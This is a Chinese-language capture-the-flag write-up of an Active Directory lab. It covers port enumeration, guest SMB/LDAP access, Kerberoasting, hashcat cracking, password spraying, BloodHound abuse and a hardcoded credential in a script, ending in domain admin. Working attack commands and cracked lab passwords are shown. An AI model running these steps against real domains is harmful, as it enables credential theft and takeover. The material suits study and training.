本次挑战将着重于利用 Active Directory 环境。
### 🔑 需要关注的核心端口

一个 Active Directory 域控制器会开放一系列特定服务。你可以把这张表作为你的"作战地图"：

|端口 (TCP)|服务名称|作用与潜在攻击面|
|---|---|---|
|**53**|DNS|域名解析服务。Kerberos 协议强依赖 DNS，配置错误或区域传输漏洞可能导致信息泄露[](https://www.cnblogs.com/yumi0721/p/18835938)[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)。|
|**88**|Kerberos|域的核心认证协议。可进行用户枚举、密码喷洒（Password Spraying），以及后续的**Kerberoasting**攻击[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://www.freebuf.com/news/346768.html)。|
|**135**|RPC|远程过程调用。用于多种管理功能，常作为获取更多信息的跳板[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://www.admin-magazine.com/index.php/Archive/2025/88/Search-for-domain-controller-vulnerabilities)。|
|**139/445**|NetBIOS-SSN / SMB|文件共享服务。可枚举用户、共享文件夹，如果签名未开启，还可能遭受**NTLM中继攻击**[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://x.threatbook.com/v5/article?threatInfoID=40868)。|
|**389/636**|LDAP / LDAPS|目录访问协议。可以查询域内几乎所有对象（用户、组、计算机），是**信息收集的核心渠道**[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://www.admin-magazine.com/index.php/Archive/2025/88/Search-for-domain-controller-vulnerabilities)。|
|**3268/3269**|全局编录|相当于LDAP的加速版，用于跨域查询，同样包含大量敏感信息[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://www.admin-magazine.com/index.php/Archive/2025/88/Search-for-domain-controller-vulnerabilities)。|
|**464**|kpasswd|Kerberos密码修改服务[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://www.freebuf.com/news/346768.html)。|
|**3389**|RDP|远程桌面。如果开放，可能存在弱口令或作为横向移动的落脚点[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://xie.infoq.cn/article/d1720d3c85ec12f0bc62080ed)。|
|**5985/5986**|WinRM|Windows远程管理。常被用于 PowerShell 远程执行命令，是横向移动的常用通道。|
|**9389**|AD Web Services|提供SOAP协议接口来查询AD。作为一种**更隐蔽的LDAP替代方案**，可用于信息收集以规避检测[](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/?utm_source=newsletter.erreur403.fr&utm_medium=referral&utm_campaign=erreur-403-36)。|

### 🚀 一般流程

掌握端口后，通用的渗透流程如下：

1. **信息收集（Enumeration is key!）**
    
    - **工具**：`nmap` 是第一步，扫描上述所有端口。随后可以使用[[windows信息收集工具#enum4linux]]或[[windows信息收集工具#nxc]]，`ldapdomaindump 等工具，通过SMB或LDAP提取域内用户、组信息。`crackmapexec` 也是验证凭据和枚举共享的利器。
    - nmap -T4 -n -sC -sV -Pn -p- 目标
        
2. **获取初始访问（Getting Initial Foothold）**
    
    - 根据开放的端口和服务选择突破口，常见手法包括：
        
        - **基于Kerberos**：利用`Kerbrute`进行**用户枚举**，或对SPN账户进行**Kerberoasting**攻击[](https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/)[](https://www.freebuf.com/news/346768.html)。
            
        - **基于SMB**：查找可读的共享文件夹（如 `SYSVOL`、`Replication`），寻找泄露的配置文件（如包含 **GPP密码**的 `Groups.xml`）[](https://www.freebuf.com/news/346768.html)。
            
        - **基于Web/应用**：如果开放了80或443端口，可能是一些与AD集成的应用（如Outlook Web App），可尝试密码喷洒[](https://www.cnblogs.com/yumi0721/p/18835938)。
            
3. **横向移动与权限提升（Lateral Movement & Privilege Escalation）**
    
    - 拿到一个普通用户后，真正的挑战才刚刚开始。你的目标是域控。
        
        - **AD证书服务攻击 (AD CS)**：如果环境配置了证书服务，可以使用`certipy`[](https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/) 寻找错误配置的证书模板（ESC1-ESC8），这可能直接让你变成域管理员[](https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/)。
            
        - **中继攻击**：如果环境允许，可以利用`Responder`和`ntlmrelayx`结合IPv6或LLMNR欺骗，**中继**到其他机器[](https://x.threatbook.com/v5/article?threatInfoID=40868)。
            
        - **票据攻击**：使用`mimikatz`、`Rubeus`或Impacket套件[](https://www.freebuf.com/news/346768.html)[](https://www.tevora.com/threat-blog/petitpotam-the-full-attack-chain-with-windows-and-linux/) 进行**Pass-the-Ticket**、**白银票据**或**DCSync**攻击，最终获取域控的哈希。
            

### 💡 小提示

- **DNS至关重要**：很多攻击（特别是Kerberos）依赖正确的DNS解析。记得将你的攻击机DNS指向域控IP，否则工具可能会无法正常工作[](https://www.cnblogs.com/yumi0721/p/18835938)。
    
- **无凭据->有凭据->高权限**：始终牢记这条主线。你的每一步操作都应该为下一步积累更多的信息或更高的权限。

# 流程
 nmap -T4 -n -sC -sV -Pn -p- 目标
 ![[Pasted image 20260307133732.png]]
从端口扫描中，我们可以看到Kerberos（88）、LDAP（389/636/3268/3269）、SMB（445）和DNS（53）等服务。  
• 这些存在强烈表明目标是域控制器（DC）。  
• 主机名被发现为 ，域名为 。  
• 因此，我们需要在hosts文件中添加一个条目，以便系统能够正确解析域
10.112.137.169 thm.local ad.thm.local
然后使用[[windows信息收集工具#nxc]]
扫描访客
nxc smb thm.local -u 'guest' -p '' --shares
┌──(root㉿kali)-[~/Desktop/THM]
└─# nxc smb ad.thm.local -u 'guest' -p '' --shares
SMB         10.49.147.124   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.49.147.124   445    AD               [+] thm.local\guest: 
SMB         10.49.147.124   445    AD               [*] Enumerated shares
SMB         10.49.147.124   445    AD               Share           Permissions     Remark
SMB         10.49.147.124   445    AD               -----           -----------     ------
SMB         10.49.147.124   445    AD               ADMIN$                          Remote Admin
SMB         10.49.147.124   445    AD               C$                              Default share
SMB         10.49.147.124   445    AD               IPC$            READ            Remote IPC
SMB         10.49.147.124   445    AD               NETLOGON                        Logon server share 
SMB         10.49.147.124   445    AD               SYSVOL                          Logon server share 
然后使用检查Idap协议有什么可以用的
┌──(root㉿kali)-[~/Desktop/THM]
└─# nxc ldap 10.49.147.124 -u 'guest' -p ''
LDAP        10.49.147.124   389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local)
LDAP        10.49.147.124   389    AD               [+] thm.local\guest: 
查找有SPN的用户
┌──(root㉿kali)-[~/Desktop/THM]
└─# nxc ldap 10.49.147.124 -u 'guest' -p '' --kerberoast kerberoast_hashes.txt
LDAP        10.49.147.124   389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local)
LDAP        10.49.147.124   389    AD               [+] thm.local\guest: 
LDAP        10.49.147.124   389    AD               [*] Total of records returned 1
LDAP        10.49.147.124   389    AD               [*] sAMAccountName: CODY_ROY, memberOf: CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local, pwdLastSet: 2024-05-10 22:06:07.611965, lastLogon: 2024-04-24 23:41:18.970113
LDAP        10.49.147.124   389    AD               $krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$46838a94d20f6802fceb69a6c0b26f98$........

这里可以看到有用户CODY_ROY而且memberOf: CN=Remote Desktop

说明有远程桌面权限，所以我们破解他的Kerberos票据

hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt --force

或者用john

john --format=krb5tgs kerberoast_hash.txt --

wordlist=/usr/share/wordlists/rockyou.txt
## hashcat
┌──(root㉿kali)-[~/Desktop/THM]
└─# hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting
You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

==================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12650H, 1456/2912 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1349 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$46838a94d20f6802fceb69a6c0b26f98$e1969fe8ea3720211c269d146ea5d092307a91055b9f9f2cf3191d310a0e4ffa.......
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*...5c288a
Time.Started.....: Sat Mar  7 13:56:33 2026, (0 secs)
Time.Estimated...: Sat Mar  7 13:56:33 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1523.6 kH/s (1.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 708608/14344385 (4.94%)
Rejected.........: 0/708608 (0.00%)
Restore.Point....: 704512/14344385 (4.91%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: SCORPIO5 -> JENNER
Hardware.Mon.#01.: Util: 26%

Started: Sat Mar  7 13:56:11 2026
Stopped: Sat Mar  7 13:56:35 2026
## 获取信息

这里我们获取了秘密为MKO)mko0
然后通过这个获取信息

获取用户信息

nxc smb 10.49.147.124 -u 'CODY_ROY' -p 'MKO)mko0' --users

看是什么组

nxc smb 10.49.147.124 -u 'CODY_ROY' -p 'MKO)mko0' --local-groups

这里我我们用这个账户远程连接到后发现文件权限受限尝试其他用户

使用密码喷洒之前获取的用户名后，又找到一个同密码用户

zachary_hunt

nxc smb 10.49.147.124 -u 'zachary_hunt' -p 'MKO)mko0' --local-groups
SMB         10.49.147.124   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False) 
SMB         10.49.147.124   445    AD               [+] thm.local\zachary_hunt:MKO)mko0 
SMB         10.49.147.124   445    AD               [*] Enumerating with SAMRPC protocol
SMB         10.49.147.124   445    AD               [+] Enumerated local groups

这里**重大发现！ZACHARY_HUNT是DnsAdmins组成员！** 这是一个非常重要的权限，可以用来提权到SYSTEM甚至Domain Admin！

这里使用BloodHound

可以看到**zachary_hunt**用户拥有对**jerri_lancaster**用户的**通用写作**权限

使用targetedKerberoast.py来请求kerberoast凭据

再次使用hashcat获取密码

lovinlife!

然后用这个获取的再次尝试rdp连接

这个账号就可以看文件夹的内容

可以再C盘找到scripts文件夹，里面有syncer。ps1

打开后内容为C:(Scripts>type syncer.ps1
 ImportActive Directory module
Import-Module ActiveDirectory
Define credentials
$Username="SANFORD_DAUGHERTY"
$Password=ConvertTo-SecureString"RESET_ASAP123" -AsPlainText-Force
$Credential=New-ObjectSystem.Management.Automation.PSCredential($Username,$Password)
Sync Active Directory
Sync-ADobject -Object “DC-thm,DC-local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
这里可以看到用户SANFORD_DAUGHERTY，密码为RESET_ASAP123
同上我们再次检查权限
nxc ldap 10.49.147.124 -u 'SANFORD_DAUGHERTY' -p 'RESET_ASAP123' -M get-desc-users 
LDAP 10.49.147.124 389 AD [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local) LDAP 10.49.147.124 389 AD [+] thm.local\SANFORD_DAUGHERTY:RESET_ASAP123 (Pwn3d!）

pwded说明这是域控管理员，那就直接拿下